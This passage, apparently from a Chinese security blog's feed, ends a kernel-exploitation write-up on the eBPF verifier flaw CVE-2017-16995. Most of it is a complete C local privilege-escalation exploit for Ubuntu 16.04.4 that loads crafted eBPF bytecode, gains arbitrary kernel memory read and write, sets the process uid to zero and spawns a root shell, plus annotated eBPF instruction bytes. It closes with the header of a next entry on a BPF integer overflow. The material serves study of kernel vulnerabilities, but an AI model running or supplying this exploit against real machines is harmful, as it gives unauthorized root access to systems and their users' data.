*/</span></span><br><span class="line"><span class="number">3.</span> <span class="string">&quot;\x55\x06\x03\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">/*BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 0, 3),             /* if (op == 0)          */</span></span><br><span class="line"><span class="number">4.</span> <span class="string">&quot;\x79\x73\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_7, 0), 读取BPF_REG_7地址的内容放到BPF_REG_3</span></span><br><span class="line"><span class="number">5.</span> <span class="string">&quot;\x7b\x32\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0),将BPF_REG_3的内容放入到BPF_REG_2</span></span><br><span class="line"><span class="number">6.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_EXIT_INSN(),</span></span><br><span class="line"><span class="number">7.</span> <span class="string">&quot;\x55\x06\x02\x00\x01\x00\x00\x00&quot;</span>  <span class="comment">//BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 1, 2),       if(op != 1 )JMP insn+2</span></span><br><span class="line"><span class="number">8.</span> <span class="string">&quot;\x7b\xa2\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_10, 0), when op == 1 将rbp寄存器的值即fp指针放到BPF_REG_2</span></span><br><span class="line"><span class="number">9.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_EXIT_INSN(),                                  /*   exit(0);             */</span></span><br><span class="line"><span class="number">10.</span> <span class="string">&quot;\x7b\x87\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0), when op == 2 往BPF_REG_7的地址写入BPF_REG_8</span></span><br><span class="line"><span class="number">11.</span> <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>  <span class="comment">//BPF_EXIT_INSN(),</span></span><br></pre></td></tr></table></figure><h3 id="综上，exp"><a href="#综上，exp" class="headerlink" title="综上，exp"></a>综上，exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ubuntu 16.04.4 kernel priv esc</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * all credits to @bleidl</span></span><br><span class="line"><span class="comment"> * - vnik</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Tested on:</span></span><br><span class="line"><span class="comment">// 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64</span></span><br><span class="line"><span class="comment">// if different kernel adjust CRED offset + check kernel stack size</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PHYS_OFFSET 0xffff880000000000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_OFFSET 0x9b8 <span class="comment">// 0x5f8</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID_OFFSET 4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_BUF_SIZE 65536</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROGSIZE 328 <span class="comment">//-32</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> sockets[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> mapfd, progfd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *__prog = <span class="string">&quot;\xb4\x09\x00\x00\xff\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;\x55\x09\x02\x00\xff\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x18\x19\x00\x00\x03\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;\x62\x0a\xfc\xff\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x79\x06\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;\x62\x0a\xfc\xff\x01\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x79\x07\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;</span></span><br><span class="line">   <span class="string">&quot;\x62\x0a\xfc\xff\x02\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x79\x08\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\xbf\x02\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x55\x06\x03\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x79\x73\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x7b\x32\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x55\x06\x02\x00\x01\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x7b\xa2\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x7b\x87\x00\x00\x00\x00\x00\x00&quot;</span></span><br><span class="line">   <span class="string">&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bpf_log_buf[LOG_BUF_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_prog_load</span><span class="params">(<span class="keyword">enum</span> bpf_prog_type prog_type,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">const</span> struct bpf_insn *insns, <span class="keyword">int</span> prog_len,</span></span></span><br><span class="line"><span class="params"><span class="function"> <span class="keyword">const</span> <span class="keyword">char</span> *license, <span class="keyword">int</span> kern_version)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">.prog_type = prog_type,</span><br><span class="line">.insns = (__u64)insns,</span><br><span class="line">.insn_cnt = prog_len / <span class="keyword">sizeof</span>(struct bpf_insn),</span><br><span class="line">.license = (__u64)license,</span><br><span class="line">.log_buf = (__u64)bpf_log_buf,</span><br><span class="line">.log_size = LOG_BUF_SIZE,</span><br><span class="line">.log_level = <span class="number">1</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">attr.kern_version = kern_version;</span><br><span class="line"></span><br><span class="line">bpf_log_buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_create_map</span><span class="params">(<span class="keyword">enum</span> bpf_map_type map_type, <span class="keyword">int</span> key_size, <span class="keyword">int</span> value_size,</span></span></span><br><span class="line"><span class="params"><span class="function">  <span class="keyword">int</span> max_entries)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">.map_type = map_type,</span><br><span class="line">.key_size = key_size,</span><br><span class="line">.value_size = value_size,</span><br><span class="line">.max_entries = max_entries&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_update_elem</span><span class="params">(<span class="keyword">uint64_t</span> key, <span class="keyword">uint64_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">.map_fd = mapfd,</span><br><span class="line">.key = (__u64)&amp;key,</span><br><span class="line">.value = (__u64)&amp;value,</span><br><span class="line">.flags = <span class="number">0</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_lookup_elem</span><span class="params">(<span class="keyword">void</span> *key, <span class="keyword">void</span> *value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">.map_fd = mapfd,</span><br><span class="line">.key = (__u64)key,</span><br><span class="line">.value = (__u64)value,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __exit(<span class="keyword">char</span> *err)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;error: %s\n&quot;</span>, err);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">prep</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, <span class="keyword">sizeof</span>(<span class="keyword">int</span>), <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span>), <span class="number">3</span>);</span><br><span class="line"><span class="keyword">if</span> (mapfd &lt; <span class="number">0</span>)</span><br><span class="line">__exit(strerror(errno));</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;mapfd finished&quot;</span>);</span><br><span class="line">progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">   (struct bpf_insn *)__prog, PROGSIZE, <span class="string">&quot;GPL&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (progfd &lt; <span class="number">0</span>)</span><br><span class="line">__exit(strerror(errno));</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;bpf_prog_load finished&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, sockets))</span><br><span class="line">__exit(strerror(errno));</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;socketpair finished&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="keyword">sizeof</span>(progfd)) &lt; <span class="number">0</span>)</span><br><span class="line">__exit(strerror(errno));</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;setsockopt finished&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">writemsg</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">ssize_t</span> n = write(sockets[<span class="number">0</span>], buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (n &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">perror(<span class="string">&quot;write&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (n != <span class="keyword">sizeof</span>(buffer))</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short write: %lu\n&quot;</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __update_elem(a, b, c) \</span></span><br><span class="line"><span class="meta">bpf_update_elem(0, (a));   \</span></span><br><span class="line"><span class="meta">bpf_update_elem(1, (b));   \</span></span><br><span class="line"><span class="meta">bpf_update_elem(2, (c));   \</span></span><br><span class="line"><span class="meta">writemsg();</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint64_t</span> <span class="title">get_value</span><span class="params">(<span class="keyword">int</span> key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint64_t</span> value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bpf_lookup_elem(&amp;key, &amp;value))</span><br><span class="line">__exit(strerror(errno));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> __get_fp(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">__update_elem(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> get_value(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> __read(<span class="keyword">uint64_t</span> addr)</span><br><span class="line">&#123;</span><br><span class="line">__update_elem(<span class="number">0</span>, addr, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> get_value(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __write(<span class="keyword">uint64_t</span> addr, <span class="keyword">uint64_t</span> val)</span><br><span class="line">&#123;</span><br><span class="line">__update_elem(<span class="number">2</span>, addr, val);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint64_t</span> <span class="title">get_sp</span><span class="params">(<span class="keyword">uint64_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> addr &amp; ~(<span class="number">0x4000</span> - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">pwn</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint64_t</span> fp, sp, task_struct, credptr, uidptr;</span><br><span class="line"></span><br><span class="line">fp = __get_fp();</span><br><span class="line"><span class="keyword">if</span> (fp &lt; PHYS_OFFSET)</span><br><span class="line">__exit(<span class="string">&quot;bogus fp&quot;</span>);</span><br><span class="line"></span><br><span class="line">sp = get_sp(fp);</span><br><span class="line"><span class="keyword">if</span> (sp &lt; PHYS_OFFSET)</span><br><span class="line">__exit(<span class="string">&quot;bogus sp&quot;</span>);</span><br><span class="line"></span><br><span class="line">task_struct = __read(sp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (task_struct &lt; PHYS_OFFSET)</span><br><span class="line">__exit(<span class="string">&quot;bogus task ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;task_struct = %lx\n&quot;</span>, task_struct);</span><br><span class="line"></span><br><span class="line">credptr = __read(task_struct + CRED_OFFSET); <span class="comment">// cred</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (credptr &lt; PHYS_OFFSET)</span><br><span class="line">__exit(<span class="string">&quot;bogus cred ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line">uidptr = credptr + UID_OFFSET; <span class="comment">// uid</span></span><br><span class="line"><span class="keyword">if</span> (uidptr &lt; PHYS_OFFSET)</span><br><span class="line">__exit(<span class="string">&quot;bogus uid ptr&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;uidptr = %lx\n&quot;</span>, uidptr);</span><br><span class="line">__write(uidptr, <span class="number">0</span>); <span class="comment">// set both uid and gid to 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (getuid() == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;spawning root shell\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__exit(<span class="string">&quot;not vulnerable?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">prep();</span><br><span class="line">pwn();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20221010170323134.png"                      alt="image-20221010170323134"                ></p><p>这里exp我是直接用的原文的exp，因为理解漏洞之后操作起来就比较简单了，主要麻烦的就是构造eBPF指令</p><hr><p>题目放在:<a class="link"   href="https://github.com/196082/196082" >https://github.com/196082/196082<i class="fas fa-external-link-alt"></i></a></p><p>参考文章:<a class="link"   href="http://p4nda.top/2019/01/18/CVE-2017-16995/#do-check" >http://p4nda.top/2019/01/18/CVE-2017-16995/#do-check<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这一篇是作为ebpf的入门文章，所以会稍微介绍一下指令集，寄存器。可能篇幅略长。&lt;/p&gt;
&lt;h2 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a&gt;漏洞简介&lt;/h2&gt;&lt;p&gt;该漏洞最早是由17年12月2</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    <category term="CVE" scheme="https://cv196082.gitee.io/categories/kernel-pwn/CVE/"/>
    
    
    <category term="ebpf" scheme="https://cv196082.gitee.io/tags/ebpf/"/>
    
  </entry>
  
  <entry>
    <title>Linux kernel 4.20 BPF 整数溢出漏洞</title>
    <link href="https://cv196082.gitee.io/2022/10/02/Linux-kernel-4-20-BPF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/"/>
    <id>https://cv196082.gitee.io/2022/10/02/Linux-kernel-4-20-BPF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</id>
    <published>2022-10-02T06:51:24.000Z</published>
    <updated>2022-10-02T06:51:57.434Z</updated>
    
